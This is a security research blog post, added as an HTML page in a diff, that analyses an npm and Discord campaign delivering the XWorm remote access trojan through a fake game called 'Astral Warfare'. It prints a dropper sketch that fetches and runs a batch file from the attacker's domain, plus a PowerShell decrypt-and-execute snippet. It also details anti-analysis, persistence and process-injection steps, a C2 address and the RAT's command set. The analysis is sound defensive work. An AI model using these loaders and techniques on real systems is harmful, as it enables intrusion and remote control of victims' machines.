@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>Astral Injection: From Fake VideoGame to XWorm RAT via npm and Discord - JFrog Security Research</title><meta name="gridsome:hash" content="0e33de210d8b42431b387ab52d4fd932806b36ec"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="Astral Injection: From Fake VideoGame to XWorm RAT via npm and Discord | JFrog"><meta data-vue-tag="ssr" name="description" content="JFrog Security researchers have discovered a multi-vector malware campaign distributing the XWorm RAT through both npm packages and a fake game website, targeting Discord users with social engineering tactics."><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link rel="preload" href="/assets/css/0.styles.ab306386.css" as="style"><link rel="preload" href="/assets/js/app.d56142a5.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.9720118d.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.9f141ac9.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.a8f6e8e3.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue~page--src--pages--malicious-packages-vue.70e229b4.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.20041e6d.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.4ee1886e.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.8664726d.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.acd80ea9.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.460e972b.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.70bb558a.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.d2ee2512.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.2ec3d7ff.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.7f393094.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.07e667fb.js"><link rel="stylesheet" href="/assets/css/0.styles.ab306386.css"><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout"><header class="py-2 main-header"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small">JFrog Security Research</span></div></div><div class="right"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3">
+      Discover
+    </a></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex item-center mobile-menu-wrapper gap-2"><!----><button class="show-menu-hamburger px-1"><img alt="Menu" src="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg" width="22" srcset="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg 22w" sizes="(max-width: 22px) 100vw, 22px" class="g-image"></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white text-gray-700 p-5 inset-0" style="display:none;"><div class="flex justify-end mb-3"><button class="p-3"><img alt="Menu" src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 12 12' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79)' width='12' height='12' xlink:href='data:image/svg%2bxml%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAJfklEQVR42u2bCWwVVRSGpwtQWpa2UFpkEWRvUQFBNEqkFMoiIogKFWsFKiAYTTBRoiwulD0KERLBoKAiZRN3UCEiUUBFRWURBFxABCn70va1FM99fhOuw8xjmzd9yXOSP236%2bmbO%2bp9zz71jGOdf8YIWgk6CewU5gvsEPQRtBfUFVQUVjNC6KiBXfeTsgdw56NEJveIvdKNqgmaCdME9gmxBf0E3QRtBXUGcICrEDBCFXHWRsxtyZ6NHOnpVu9CNEgSpgs7cYKDgfkFPQXtBQ6xYSRAZIspHIk888rVH3vuRvz/6pKKf4xUjqCNoJ7hTkCt4VDBcMEDQVdBa0EBQS1BdUJnwiywHpSvw/OrI0wD5uiLvcOTPRZ926BdjzXl1g0Q%2bbCW4XTBUMEYwSZAnGCUYIugj6EiYNRGkkHvRHhsgmuemIEcb5OqDnKOQexJ6DEWvVuiZiN5%2bYmguSMNC6p%2bG8eVXBYsFiwSvCV4UPC14WNAPYmkpSBZU9NgAlVC%2bJXL0Qy4l3wvIuwj556LPMPRrh75KbyMDgugi6I2lJggWCNYIvhN8L9gg%2bESQL5gpGCcYzPcbQ0BeXlXwfAZyjEOufORcj9xK/s/QJw/9eqOv0ttvOVUmsgQPCcbieaX8TkGB4KjgoOA3wSbBKsGbgufINWXRJEGEh/mfxHMHIMebyLUJOQ8idwF6rEGvseiZRXUwHhQ8IBgkeEwwWbAEy6kvn9Xg4287BJ8TWo8LuguaklPRHuR%2bdZ7XnefPRZ4dyOezyF2APkvQ7zH0VXr7m4Us6uVwwn8x4XPUciOFUqy7RfC%2bYBoWzSCv6kCslV1slqI1tr%2bKctYJdp%2bGHFuQq9RG5mNExmL0G4G%2bSm9/x6SahjsIp1EQyAZueNYGhYK9gq8gmkkQkGLgWyAXRVCxLhkghjKnvH4zJc3kqnzk2ItcdvIe4n/mCZ6iP%2bhFBPnbxjY0D5l4U7Hox%2bSSz%2baGZ4iO3YJ1gmUQ0NM0Hp2pLoku8YIZ8ul4TjlpBiH9BTl%2bBLnsZN0DP8ygEnTDkEp3f%2b9cR2si%2bqDIQtJARUGJzY2LBIcFv2vEuACvKCN0ENRzoTyqFrc2Aivln8WTKwUbcUIB8th5XznqJ4ylCPBuFG%2bE7v5yEouVrxbchpVeEnwq2I4RTlvyq4zoOMXnO4mGBTQefQXXEgWXS4wRyNWCkB2F8orwtgn%2bEhwXFNt4v5io2EUFeFnwCNxxDXJVNQkmEk8lEQX3Yq03%2bPJmwugIeWZ9WAmfKSOsFsziYZkIn8IiJIbnRQRQOApZVF9Rk1qfTs5PF6xA%2bYPIUmZxSjFGUcb5WfAlPPE8hN8OeSpbHROBkI154CDC7RXBe5Ci2RcU24RaCUL9IFgumEokKXK9iRxOIeIiAxggFkc0IlS70eiY1WkjyhU6yKAc8Sv/t4KImUB73IUVYbxTVMYgZBqhoiw2EmUWQji7sXCZjQAqHf6AcZfhsSept525b1KAlIgkNJvR12dpz8/Xnn8swPN/x1lLad2f4PkqGq%2bjjMY6RaE5VEgmEnQP5F2CB1T1%2bBaims93c4mshoSf3VURYurAIOMZIvD9i4hAHxGoCPltwRTSpicR2AwyrRaImCPxjl0ODsGjKy8yB/dDoGYOPsu6vDX3jXKYRl0LgY4WvK5x0N4AHOTTOGgVHDSCkG%2bOQ6sS4Ze0dL9cFjYNcRgWVv8/hxY0E2/UwsiViIhE8j6dpmomyigi%2b9uhCpU4VCFlvLtYKSZc6fTqYuuwU0ocwoPv0IfnMrBoj7dbwA03wDsqX8dTt1UfcsChxptl7g%2bI19qH3Mp4zJV23K4Tmw4n6J1YqUPbvEfzzkRtMZJFye2H4sNZ2SneWAubn7S5ZxmR9xvcsJywH23pRBPcWoFZe/Fell58Azl62mHxdBg%2bWItnZ8PQk7nHRJhehf1b9BJbCW2fg/f3Q7RLIbwRhP2tWu/h1lrET4wxREJtHpBOdZgKS28mV4tsvFXIZ2q5%2bg0DCrXW%2bIAeQ%2bFDOs91KP8X%2bW3XdJkGXUEkDoPwWhL2CSgflNF9FIZoQokcSalaA2EdIGx9mvClKFNAzv4CiW6mT/%2bR37fBKeoeJ7Q1SBn3KIRTdlFd5lHne8L2CV7tV0RQytqSx89QslZBXL%2bi7CmUOMPP09p06QBhrDy9D%2bxHwROaAU3FD8Mlm6kqC%2bkvsiHUZK/3KuIoWx1pWkZDREvJdTOMTWVK%2bFmIYU6CExCaiVOkUYlW5v4m5NdRTWZTjcyZZBNzYePlZS6emtO59YXFx8PiJpGZKVGMAYq1333a34owTpH299OWEdwChi%2bPUjk6Mh1Kpp/wfCsqlgamPjU9nWh4DjZfTzoc0jzr09KiTEOpxSCFpMseiHMJFWMwhNeKGUZNotHrfQk/D0RoS%2bl4UiKDSJgFq28jt4%2bjlM%2bhXzDJsgQDnLJMdGdrnaQqxzWoTFHIEGGEwJVIR5dNefwAlt%2bHAYoCKK%2bPsPQWdztz/uk0T%2b1JvVDZlzyvYUqlu1MM/S5t6p8sYYsd5nZ2kWCSn4qgjzDoAJa0cUaIXhVY6PSFDN9heaoboOwSDbCVJmkyq8k06%2bZmOEZAlVA1gFccUMsIgQMaXlcBc57QlTSrqQ02y6UKlEcfMJE%2bIJPJUkMqQpXy6AO87gTX0glOphPsj8HT6AQ9J0av1wI7tLXAHNYCuQw/mhoXcfgplFaDBS6sBvOpNA8w9U3xKg1CaR4wn32HO7TN2IrBIMRgTIRWujARWqlNhDIh4noYwtWJkFszwc8ZpLo5E1zGd0dAxB2CMRN0cyo8ARYfaJw7p3MlU%2bGvtKnwGJqlLoaL5xPc3BeYpNXxGxliNrfsC%2bRc5r7Aas3AgwyXzie4uTM0G893IZqSCNGKQdgZuuzzCcHaG1xI5PSjg6vhsJ53Y29wtWVv0Ho%2bIeDeoNu7w%2bb%2bfB736Ej7GhPE3WHzfMIU47/nE5qxNV49UFq4dT7A3J%2bfztw%2bm0VSKlHl1fkA83xCDrxzvfHveag4uyhw%2b4SI6QHzmH0TIivO8PaEyHzj3AmRTMsGSoRhuH9GKND%2bfCWjfM8Imcd6a%2buNUjBOibm1Px%2bMU2IZRFcNcwHl9jnBPMPd/flgnRNsjMOv%2bKToesP5pKhb%2b/NunxTtbmgnRa/krPDXhvNZ4WQj9M4KK0J8CiP2Qvf/T4uH/fsC4fLGyGfoNcawvDES9u8Mhf1bY%2bHy3uAQw%2bG9QWu5Cbs3R61XWL87bBhh9vb4P/%2bX4wkCBpt7AAAAAElFTkSuQmCC' /%3e%3c/svg%3e" width="12" data-src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" data-srcset="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg 12w" data-sizes="(max-width: 12px) 100vw, 12px" class="g-image g-image--lazy g-image--loading"><noscript><img src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" class="g-image g-image--loaded" width="12" alt="Menu"></noscript></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200"><a href="/" class="text-gray-700 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/model-threats/" class="text-gray-700">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/vulnerabilities/" class="text-gray-700">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener" class="text-gray-700">
+        Follow JFrog Security
+      </a></li></ul></div></header><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">Astral Injection: From Fake VideoGame to XWorm RAT via npm and Discord</h1><p class="mt-1 mb-5 green">Meitar Palas and Shavit Satou, JFrog Security Researchers | 15 Apr, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black"><p>The JFrog Security research team have uncovered a malware campaign that spreads the XWorm remote access trojan through multiple channels: a malicious npm package named <code>@kindo/selfbot</code> and a fake game website promoted through hijacked Discord accounts. The attackers use social engineering to trick victims into downloading malware disguised as a legitimate indie game called "Astral Warfare."</p>
+<h2 id="the-social-engineering-play"><a href="#the-social-engineering-play" aria-hidden="true" tabindex="-1"><strong>The Social Engineering Play</strong></a></h2>
+<p>The campaign operates through compromised Discord accounts. Attackers hijack legitimate user accounts, then message the victim's friends with a seemingly innocent request: "Would you test my new game?" They provide a link to a professional-looking website at <code>astralwarfare[.]fr</code> along with the password needed to unpack the downloaded file.
+<img src="/img/RealTimePostImage/post/astral_injection/astral_website_hero.png"></p>
+<p>The website is convincingly designed, featuring game trailers, a fictional storyline about a guardian named "Ekis," and multiple download buttons. However, the downloaded <code>Astral_Warfare.rar</code> file contains nothing but malware.<br>
+The "Ekis" game is entirely fabricated, the website's gameplay screenshots are stolen from a legitimate game  called “Elsie” developed by “Knight Shift Games”.  </p>
+<p><img src="/img/RealTimePostImage/post/astral_injection/astral_website_lore.png"></p>
+<p><img src="/img/RealTimePostImage/post/astral_injection/discord_screen.png"></p>
+<h2 id="the-npm-vector"><a href="#the-npm-vector" aria-hidden="true" tabindex="-1"><strong>The npm Vector</strong></a></h2>
+<p>In parallel to the Discord campaign, the attackers also published a malicious npm package:</p>
+<ul>
+<li><strong>Package:</strong> <code>@kindo/selfbot</code>  </li>
+<li><strong>Versions:</strong> 1.0.0 through 1.0.4  </li>
+<li><strong>Claimed purpose:</strong> "Just a selfbot"  </li>
+<li><strong>Actual purpose:</strong> Malware dropper</li>
+</ul>
+<p>The package takes advantage of npm's <code>preinstall</code> hook to execute malicious code immediately upon installation. Simply running <code>npm install</code> is enough to trigger the payload.</p>
+<h3 id="dual-execution-path"><a href="#dual-execution-path" aria-hidden="true" tabindex="-1">Dual Execution Path</a></h3>
+<p>The package has two triggers:</p>
+<ol>
+<li><strong>Install-time:</strong> The <code>preinstall</code> script in <code>package.json</code> runs <code>scripts/selfbot.js</code>  </li>
+<li><strong>Import-time:</strong> <code>index.js</code> exports the selfbot module, which runs its main function immediately when required</li>
+</ol>
+<p>Either action - installing or importing - is enough to trigger the payload.</p>
+<h3 id="suspicious-self-dependency"><a href="#suspicious-self-dependency" aria-hidden="true" tabindex="-1">Suspicious Self-Dependency</a></h3>
+<p>The package declares a dependency on itself (<code>"@kindo/selfbot": "^1.0.0"</code>). That is not normal - either someone republished sloppily.</p>
+<h2 id="technical-analysis-the-multi-stage-dropper"><a href="#technical-analysis-the-multi-stage-dropper" aria-hidden="true" tabindex="-1"><strong>Technical Analysis: The Multi-Stage Dropper</strong></a></h2>
+<p>Both the npm package and the fake game executable follow similar staging patterns to deploy the XWorm RAT.</p>
+<h3 id="stage-0-javascript-dropper-npm"><a href="#stage-0-javascript-dropper-npm" aria-hidden="true" tabindex="-1">Stage 0: JavaScript Dropper (npm)</a></h3>
+<p>The <code>scripts/selfbot.js</code> file is obfuscated but deobfuscates to a simple downloader:</p>
+<pre><code class="language-javascript">const url = "https://astralwarfare.fr/script.bat";
+const out = join(process.cwd(), "script.bat");
+
+async function download() {
+  // Downloads script.bat from the attacker's server
+}
+
+async function run() {
+  // Executes the batch file via cmd
+}
+</code></pre>
+<p>The script downloads <code>https://astralwarfare[.]fr/script.bat</code> and executes it.</p>
+<h3 id="stage-0-go-dropper-game-executable"><a href="#stage-0-go-dropper-game-executable" aria-hidden="true" tabindex="-1">Stage 0: Go Dropper (Game Executable)</a></h3>
+<p>The <code>Astral_Warfare.exe</code> binary is a 64-bit Go application that:</p>
+<ol>
+<li>Concatenates 5,260 embedded string fragments into a large obfuscated Base64 blob  </li>
+<li>Removes Greek-letter noise using regex <code>[αβγδεζηθικλμνξοπ]+</code>  </li>
+<li>Base64-decodes the cleaned blob into a batch script  </li>
+<li>Writes the batch to <code>%TEMP%\&#x3C;random>.bat</code>  </li>
+<li>Executes it via <code>ShellExecuteW</code> or <code>cmd.exe /C</code></li>
+</ol>
+<p>Both droppers lead to the same Stage 1 batch payload.</p>
+<h3 id="stage-1-obfuscated-batch-script"><a href="#stage-1-obfuscated-batch-script" aria-hidden="true" tabindex="-1">Stage 1: Obfuscated Batch Script</a></h3>
+<p>The batch file (<code>252,438</code> bytes, <code>3,557</code> lines) is heavily obfuscated with:</p>
+<ul>
+<li>Hundreds of junk labels  </li>
+<li>Thousands of junk variable assignments  </li>
+<li>Fragmented commands assembled from environment variables  </li>
+<li>Embedded payloads hidden in <code>::</code> comment lines and <code>@</code>  prefixed lines</li>
+</ul>
+<p><img src="/img/RealTimePostImage/post/astral_injection/first_bat_file.png"></p>
+<p>Key behaviors:</p>
+<p><strong>Anti-Analysis Checks:</strong></p>
+<ul>
+<li>Exits if username is <code>Admin</code> or <code>admin</code> and <code>%TEMP%\VBE</code> or <code>%TEMP%\mapping.csv</code> exists  </li>
+<li>Exits if RAM is below 3 GB  </li>
+<li>Exits if system or BIOS manufacturer indicates VMware</li>
+</ul>
+<p><strong>Staging:</strong></p>
+<ul>
+<li>Creates <code>C:\ProgramData\IntelDrIver</code> directory  </li>
+<li>Copies itself to <code>C:\ProgramData\IntelDrIver\rEgX.cmd</code>  </li>
+<li>Recursively marks files as hidden/system</li>
+</ul>
+<p><strong>Disguised PowerShell:</strong></p>
+<ul>
+<li>Copies legitimate <code>powershell.exe</code> to <code>%USERPROFILE%\Downloads\CPU.exe</code>  </li>
+<li>Hides the renamed binary to reduce obvious PowerShell command lines</li>
+</ul>
+<p><strong>Payload Extraction:</strong></p>
+<ul>
+<li>Extracts all <code>::</code> lines into <code>C:\ProgramData\IntelDriver\icon.png</code>  </li>
+<li>Extracts all <code>@</code>  lines into <code>C:\ProgramData\IntelDriver\logo.jpg</code>  </li>
+<li>These are not real images - they contain encrypted payloads</li>
+</ul>
+<p><strong>Decryption and Execution:</strong></p>
+<pre><code>$k = 'd6'  # XOR key
+$d = [Convert]::FromBase64String((Get-Content 'logo.jpg' -Raw))
+$s = ''
+$idx = 0
+foreach ($b in $d) {
+  $s += [char]($b -bxor [byte][char]$k[$idx])
+  $idx++
+  if ($idx -ge $k.Length) { $idx = 0 }
+}
+IEX $s  # Execute decrypted PowerShell
+</code></pre>
+<h3 id="stage-2-powershell-loader"><a href="#stage-2-powershell-loader" aria-hidden="true" tabindex="-1">Stage 2: PowerShell Loader</a></h3>
+<p>The decrypted PowerShell loader (<code>17,415</code> bytes) uses multiple layers of obfuscation:</p>
+<ul>
+<li>Base64 + XOR decoding  </li>
+<li>Greek-letter junk insertion  </li>
+<li>ROT13-like alphabet shifts for embedded strings</li>
+</ul>
+<p><strong>String Decoder Function:</strong> <code>Mp4Vg7VapA</code></p>
+<p>Important decoded strings include:</p>
+<ul>
+<li><code>New-Item</code>, <code>-Force | Out-Null</code>  </li>
+<li><code>C:\ProgramData\IntelDriver</code>, <code>windows.ps1</code>  </li>
+<li>Process names: <code>explorer</code>, <code>SecurityHealthSystray</code>, <code>OneDrive</code>, <code>sihost</code>, <code>taskhostw</code>, <code>RuntimeBroker</code></li>
+</ul>
+<p><strong>Core Functions:</strong></p>
+<ul>
+<li><code>si2ah5OX1r</code>: Reads file, strips noise, Base64-decodes  </li>
+<li><code>qhx0GpqU7P</code>: Decodes file with XOR  </li>
+<li><code>lh9NCC9Ejj</code>: Scans process memory for marker bytes <code>DE AD BE CA FE BA EF</code>  </li>
+<li><code>Cchbid97qT</code>: Performs remote-thread injection</li>
+</ul>
+<p><strong>Persistence:</strong> If the primary payload path fails, the loader creates a scheduled task:</p>
+<ul>
+<li>Task name: <code>applicationbackup_</code>  </li>
+<li>XML path: <code>%APPDATA%\applicationbackup_.xml</code>  </li>
+<li>VBS path: <code>%LOCALAPPDATA%\applicationbackup_.vbs</code>  </li>
+<li>Description: <code>IntelDriver System Service</code>  </li>
+<li>Trigger: User logon  </li>
+<li>Action: <code>wscript.exe</code> launching the VBS, which runs <code>C:\ProgramData\IntelDriver\rEgX.cmd</code></li>
+</ul>
+<p><strong>Process Injection:</strong></p>
+<ul>
+<li>Primary target: <code>explorer</code>  </li>
+<li>Secondary targets (after 10 iterations): <code>SecurityHealthSystray</code>, <code>OneDrive</code>, <code>sihost</code>, <code>taskhostw</code>, <code>RuntimeBroker</code>  </li>
+<li>Injects Stage 4 shellcode using <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code>  </li>
+<li>Injects up to 20 times with sleeps between attempts</li>
+</ul>
+<h3 id="stage-3-decoded-payload"><a href="#stage-3-decoded-payload" aria-hidden="true" tabindex="-1">Stage 3: Decoded Payload</a></h3>
+<p>The loader attempts to decode <code>icon.png</code> into <code>windows.ps1</code>:</p>
+<ol>
+<li>Strip <code>X/Ab</code> noise fragments  </li>
+<li>Strip non-Base64 characters  </li>
+<li>Base64 decode  </li>
+<li>XOR with key <code>d6</code></li>
+</ol>
+<p>The output did not cleanly resolve to plaintext PowerShell in our static analysis, suggesting either an additional nested transform or embedded PE data.</p>
+<h3 id="stage-4-injected-shellcode"><a href="#stage-4-injected-shellcode" aria-hidden="true" tabindex="-1">Stage 4: Injected Shellcode</a></h3>
+<p>The shellcode (<code>50,369</code> bytes) is position-independent x64 code with:</p>
+<ul>
+<li>Manual PEB-based module resolution  </li>
+<li>Anti-AMS/ETW targeting (<code>amsi</code>, <code>wldp</code>, <code>ntdll</code>, <code>EtwEventWrite</code>)  </li>
+<li>Custom ARX/XOR stream decryptor  </li>
+<li>XPRESS-family decompression</li>
+</ul>
+<p>After decryption, it loads a compressed .NET module.</p>
+<h3 id="stage-5-xwormclient-rat"><a href="#stage-5-xwormclient-rat" aria-hidden="true" tabindex="-1">Stage 5: XWormClient RAT</a></h3>
+<p>The final payload is <code>XWormClient.exe</code>, a .NET RAT with the following configuration:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Config Item</th>
+<th align="left">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">C2 Host</td>
+<td align="left"><code>185.94.29.43</code></td>
+</tr>
+<tr>
+<td align="left">C2 Port</td>
+<td align="left"><code>7004</code></td>
+</tr>
+<tr>
+<td align="left">Protocol Separator</td>
+<td align="left"><code>&#x3C;Xwormmm></code></td>
+</tr>
+<tr>
+<td align="left">Group</td>
+<td align="left"><code>XWorm V7.4</code></td>
+</tr>
+<tr>
+<td align="left">Mutex</td>
+<td align="left"><code>ksUtjUa9iXc5wwbk</code></td>
+</tr>
+<tr>
+<td align="left">USB Name</td>
+<td align="left"><code>USB.exe</code></td>
+</tr>
+<tr>
+<td align="left">Sleep Interval</td>
+<td align="left"><code>1</code> second</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Command Matrix:</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Command</th>
+<th align="left">Behavior</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>pong</code></td>
+<td align="left">Keepalive response</td>
+</tr>
+<tr>
+<td align="left"><code>rec</code></td>
+<td align="left">Restart application</td>
+</tr>
+<tr>
+<td align="left"><code>CLOSE</code></td>
+<td align="left">Shutdown connection</td>
+</tr>
+<tr>
+<td align="left"><code>uninstall</code></td>
+<td align="left">Self-delete via BAT flow</td>
+</tr>
+<tr>
+<td align="left"><code>update</code></td>
+<td align="left">Replace executable with new payload</td>
+</tr>
+<tr>
+<td align="left"><code>DW</code></td>
+<td align="left">Download and execute from disk</td>
+</tr>
+<tr>
+<td align="left"><code>FM</code></td>
+<td align="left">Reflective load .NET payload in memory</td>
+</tr>
+<tr>
+<td align="left"><code>LN</code></td>
+<td align="left">Download URL to temp and execute</td>
+</tr>
+<tr>
+<td align="left"><code>Urlopen</code></td>
+<td align="left">Open URL in browser</td>
+</tr>
+<tr>
+<td align="left"><code>Urlhide</code></td>
+<td align="left">Hidden HTTP GET</td>
+</tr>
+<tr>
+<td align="left"><code>PCShutdown/PCRestart/PCLogoff</code></td>
+<td align="left">System control</td>
+</tr>
+<tr>
+<td align="left"><code>RunShell</code></td>
+<td align="left">Execute arbitrary command</td>
+</tr>
+<tr>
+<td align="left"><code>StartDDos/StopDDos</code></td>
+<td align="left">HTTP flood attack</td>
+</tr>
+<tr>
+<td align="left"><code>StartReport/StopReport</code></td>
+<td align="left">Window title monitoring</td>
+</tr>
+<tr>
+<td align="left"><code>$Cap</code></td>
+<td align="left">Screenshot capture and exfiltration</td>
+</tr>
+<tr>
+<td align="left"><code>plugin/savePlugin/RemovePlugins</code></td>
+<td align="left">Plugin management via registry</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Plugin System:</strong></p>
+<ul>
+<li>Registry cache: <code>HKCU\Software\&#x3C;ID></code>  </li>
+<li>ID derived from MD5 of hardware info (20-char uppercase)  </li>
+<li>Plugins stored compressed with gzip  </li>
+<li>Methods: <code>Run</code>, <code>RunRecovery</code>, <code>RunOptions</code>, <code>injRun</code>, <code>UACFunc</code>, <code>ENC</code>/<code>DEC</code></li>
+</ul>
+<p><strong>C2 Protocol:</strong></p>
+<ul>
+<li>Framing: <code>ASCII(len(ciphertext)) || 0x00 || ciphertext</code>  </li>
+<li>Encryption: AES-ECB with key <code>MD5(Settings.KEY)</code>  </li>
+<li>Beacons detailed host profile: username, OS, arch, group, webcam, CPU/GPU/RAM, AV products</li>
+</ul>
+<h2 id="cross-vector-analysis"><a href="#cross-vector-analysis" aria-hidden="true" tabindex="-1"><strong>Cross-Vector Analysis</strong></a></h2>
+<p>Both the npm package and the game executable converge on the same infrastructure:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Vector</th>
+<th align="left">Initial Dropper</th>
+<th align="left">Stage 1</th>
+<th align="left">Stage 2</th>
+<th align="left">Stage 3</th>
+<th align="left">Final Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">npm</td>
+<td align="left">JavaScript downloader (<code>selfbot.js</code>)</td>
+<td align="left"><code>script.bat</code> from URL</td>
+<td align="left">PowerShell loader</td>
+<td align="left">(Encrypted)</td>
+<td align="left">XWorm RAT</td>
+</tr>
+<tr>
+<td align="left">Game</td>
+<td align="left">Go binary (<code>Astral_Warfare.exe</code>)</td>
+<td align="left">Embedded batch</td>
+<td align="left">PowerShell loader</td>
+<td align="left">Shellcode</td>
+<td align="left">XWorm RAT</td>
+</tr>
+</tbody>
+</table>
+<p>The shared infrastructure (<code>astralwarfare[.]fr</code>), consistent staging patterns, and identical final payloads indicate a single threat actor operating multiple distribution channels.</p>
